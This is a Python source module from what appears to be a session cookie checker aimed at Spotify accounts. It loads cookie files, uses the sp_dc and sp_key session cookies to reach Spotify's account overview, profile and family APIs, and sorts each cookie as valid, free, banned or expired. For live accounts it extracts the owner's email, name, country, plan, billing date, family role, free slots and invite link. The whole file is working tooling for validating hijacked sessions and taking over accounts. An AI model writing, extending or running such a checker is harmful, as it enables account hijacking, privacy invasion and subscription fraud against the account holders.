"""
Spotify Cookie Checker — Real API approach (harshitkamboj reference)
Flow: account/overview (HTML parse) → profile API → family API
"""
import re
import requests
from .base import parse_cookies, make_result, new_session, rex
from config import TIMEOUT

OVERVIEW_URLS = [
    "https://www.spotify.com/us/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account",
    "https://www.spotify.com/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account",
]
PROFILE_URL = "https://www.spotify.com/api/account-settings/v1/profile"
FAMILY_URL  = "https://www.spotify.com/api/family/v1/family/home"

OVERVIEW_H = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}
PROFILE_H = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Cache-Control": "no-cache",
    "Referer": "https://www.spotify.com/account/profile/",
}


def _infer_plan(plan_name: str) -> tuple[str, str]:
    p = (plan_name or "").lower()
    if "family" in p and "basic" in p: return "family_basic",       "Family Basic"
    if "family" in p:                  return "family_premium_v2",  "Family Premium"
    if "duo" in p:                     return "duo_premium",         "Duo Premium"
    if "student" in p and "hulu" in p: return "student_hulu",       "Student + Hulu"
    if "student" in p:                 return "student_premium",     "Student Premium"
    if "mini" in p:                    return "premium_mini",        "Premium Mini"
    if "basic" in p:                   return "basic_premium",       "Premium Basic"
    if "premium" in p:                 return "premium",             "Premium"
    if "free" in p or not p:           return "free",                "Free"
    return "unknown", plan_name or "Unknown"


def _parse_overview(html: str) -> dict:
    src = html.replace('\\"', '"').replace("&quot;", '"')
    combined = html + "\n" + src
    logged_in = (
        'loggedIn\\":true' in html or
        '"loggedIn":true' in src or
        '"isLoggedInUser":true' in src
    )
    return {
        "loggedIn":    logged_in,
        "planName":    rex(combined, r'planName\\":\\"([^"]+)', r'"planName":"([^"]+)"'),
        "country":     (rex(combined, r'country\\":\\"([A-Za-z]{2})', r'"country":"([A-Za-z]{2})"',
                                      r'countryCode\\":\\"([A-Za-z]{2})', r'"countryCode":"([A-Za-z]{2})"') or "").upper(),
        "email":       rex(combined, r'email\\":\\"([^"]+)', r'"email":"([^"]+)"'),
        "isSubAccount":rex(combined, r'isSubAccount\\":(true|false)', r'"isSubAccount":(true|false)'),
        "isTrial":     rex(combined, r'isTrialUser\\":(true|false)', r'"isTrialUser":(true|false)') == "true",
        "inviteLink":  rex(combined, r'inviteLink\\":\\"([^"]+)', r'"inviteLink":"([^"]+)"',
                                     r'(https://www\.spotify\.com/[^\s"]*family[^\s"]*)'),
        "freeSlots":   rex(combined, r'freeSlots\\":\s*(\d+)', r'"freeSlots":\s*(\d+)'),
        "nextPayment": rex(combined, r'nextPaymentDate\\":\\"([^"]+)', r'"nextPaymentDate":"([^"]+)"'),
    }


def check(content: str, filename: str) -> dict:
    cookies = parse_cookies(content)
    if not cookies.get("sp_dc") and not cookies.get("sp_key"):
        return make_result(filename, content, "INVALID",
                           "Missing sp_dc cookie — required for Spotify")

    s = new_session(cookies, OVERVIEW_H)
    try:
        overview_resp = None
        last_code = None
        for url in OVERVIEW_URLS:
            r = s.get(url, timeout=TIMEOUT)
            last_code = r.status_code
            if r.status_code == 403:
                return make_result(filename, content, "BANNED", "403 — Account banned/restricted")
            if r.status_code == 429:
                return make_result(filename, content, "RATE_LIMITED", "Rate limited by Spotify")
            if r.status_code == 200:
                overview_resp = r
                break

        if overview_resp is None:
            return make_result(filename, content, "INVALID", f"Overview failed: HTTP {last_code}")

        data = _parse_overview(overview_resp.text)
        if not data["loggedIn"]:
            return make_result(filename, content, "INVALID", "Not logged in — cookie expired")

        plan_key, plan_display = _infer_plan(data["planName"])
        extra = {"plan": plan_display, "country": data["country"]}
        if data["email"]:       extra["email"] = data["email"]
        if data["isTrial"]:     extra["trial"] = "Yes"
        if data["nextPayment"]: extra["next_billing"] = data["nextPayment"]

        # Profile API — get email / name
        if not extra.get("email"):
            try:
                pr = s.get(PROFILE_URL, headers=PROFILE_H, timeout=TIMEOUT, allow_redirects=False)
                if pr.status_code == 200:
                    pj = pr.json()
                    ps = pj.get("profile", {})
                    extra["email"] = ps.get("email") or pj.get("email", "")
                    extra["name"]  = ps.get("name")  or pj.get("name",  "")
            except Exception:
                pass

        # Family API — owner / member / slots
        if plan_key in ("family_premium_v2", "family_basic", "duo_premium"):
            try:
                fr = s.get(FAMILY_URL, headers=PROFILE_H, timeout=TIMEOUT, allow_redirects=False)
                if fr.status_code == 200:
                    fj = fr.json()
                    is_master = fj.get("isMaster", False)
                    if is_master:
                        extra["role"] = "👑 Owner"
                        slots = fj.get("freeSlots") or data["freeSlots"]
                        if slots: extra["free_slots"] = str(slots)
                        invite = fj.get("inviteLink", "") or data["inviteLink"]
                        if invite: extra["invite_url"] = invite
                    else:
                        extra["role"] = "Member"
            except Exception:
                if data["isSubAccount"] == "false": extra["role"] = "👑 Owner"
                elif data["isSubAccount"] == "true": extra["role"] = "Member"

        status = "FREE" if plan_key == "free" else "VALID"
        return make_result(filename, content, status, "Cookie working ✓", extra)

    except requests.exceptions.Timeout:
        return make_result(filename, content, "TIMEOUT", "Request timed out")
    except Exception as e:
        return make_result(filename, content, "ERROR", str(e))
